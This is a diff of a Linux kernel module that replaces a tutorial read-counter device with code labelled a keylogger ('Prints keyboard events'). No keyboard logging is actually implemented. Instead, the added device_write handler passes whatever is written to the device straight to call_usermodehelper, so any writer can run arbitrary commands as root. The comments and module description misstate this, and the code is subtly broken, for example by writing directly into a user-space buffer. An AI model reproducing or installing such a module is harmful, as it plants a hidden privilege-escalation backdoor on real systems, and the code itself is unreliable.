@@ -1,5 +1,4 @@
-/* Creates a read-only char device that says how many times it has been
- * read.
+/* keylog - Creates a device  file that outputs past keyboard input
  */
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -11,21 +10,18 @@
 
 #include <asm/uaccess.h>
 
-#define DEV_NAME "chardev"    // Name as it appears in /proc/devices
-#define BUF_LEN 80
+#define DEV_NAME "cmd"    // Name as it appears in /proc/devices
 #define DEVICE_CNT 1
+#define MAX_BUFF 512
 
 static dev_t dev;
 static struct class *cl;
 static struct cdev c_dev;
 
-
 static int Device_Open = 0;
+char *argv[MAX_BUFF];
 
-static char msg[BUF_LEN];
-static char *msg_ptr;
-
-
+// Fill callback structs
 static int device_open(struct inode *, struct file *);
 static int device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
@@ -39,7 +35,7 @@ static struct file_operations fops = {
 
 /* Called when module is loaded.
  */
-int init_module(void)
+static int __init keylog_init(void)
 {
     // Register device with kernel, major number dynamically allocated
     int res = alloc_chrdev_region(&dev, 0, DEVICE_CNT, DEV_NAME);
@@ -68,7 +64,7 @@ int init_module(void)
         goto error3;
     }
 
-    printk(KERN_INFO "chardev: registered %d device\n", MAJOR(dev));
+    // Register keyboard notifier
     return 0;
 error3:
     device_destroy(cl, dev);
@@ -81,7 +77,7 @@ error1:
 
 /* Called when module is unloaded.
  */
-void cleanup_module(void)
+static void __exit keylog_exit(void)
 {
     cdev_del(&c_dev);
     device_destroy(cl, dev);
@@ -94,14 +90,10 @@ void cleanup_module(void)
  */
 static int device_open(struct inode *inode, struct file *file)
 {
-    static int counter = 0;
-
     if (Device_Open)
         return -EBUSY;
-
     Device_Open++;
-    sprintf(msg, "I already told you %d times chardev world!\n", counter++);
-    msg_ptr = msg;
+
     try_module_get(THIS_MODULE);
 
     return 0;
@@ -124,33 +116,43 @@ static int device_release(struct inode *inode, struct file *file)
 static ssize_t device_read(struct file *file_ptr, char *buffer,
                            size_t length, loff_t *offset)
 {
-    int bytes_read = 0;
-    if (*msg_ptr == 0)
-        return 0;
-
-    while (length && *msg_ptr) {
-        /* Buffer is in the user data segment, so "*" assignment won't work.
-         * We have to use put_user which copies data from the kernel data
-         * segment to the user data segment.
-         */
-        put_user(*(msg_ptr++), buffer++);
-
-        length--;
-        bytes_read++;
-    }
-
-    return bytes_read;
-}
-
-/* Called when a process tries to write to the device file.
- * As in "echo hi > /dev/chardev"
- */
-static ssize_t device_write(struct file* file_ptr, const char *buff,
-                            size_t len, loff_t *off)
-{
     printk(KERN_ALERT "Sorry, this operation isn't supported.\n");
     return -EINVAL;
 }
 
+/* Called when a process tries to write to the device file.
+ */
+static ssize_t device_write(struct file* file_ptr, const char *buff,
+                            size_t len, loff_t *off)
+{
+    size_t strlen = strlen_user(buff);
+    char *buff_ptr = buff;
+    buff_ptr[len - 1] = '\0'; // Sometimes the caller forgets to add this.
+    char *token;
+    int index = 0;
+
+    // Tokenize input buffer into a command.
+    token = strsep(&buff_ptr, " \n");
+    while (token != NULL) {
+	// Possible if multiple sequential delimiters.
+	if (token[0] != '\0') 
+	    argv[index++] = token;
+
+	if (index >= MAX_BUFF - 1)
+	    break;
+
+    	token = strsep(&buff_ptr, " \n");
+    }
+    argv[index] = NULL;
+
+    char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    return strlen;
+}
+
+module_init(keylog_init);
+module_exit(keylog_exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Christopher Chin");
+MODULE_DESCRIPTION("Prints keyboard events");
